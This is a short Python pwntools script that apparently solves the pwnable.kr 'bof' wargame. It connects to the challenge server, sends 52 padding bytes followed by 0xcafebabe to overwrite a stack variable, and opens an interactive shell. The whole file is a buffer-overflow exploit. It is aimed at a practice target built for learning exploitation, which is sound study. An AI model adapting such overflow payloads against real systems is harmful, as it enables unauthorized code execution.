from pwn import *

r = remote("pwnable.kr", 9000)

r.sendline("A"*52+"\xbe\xba\xfe\xca")

r.interactive()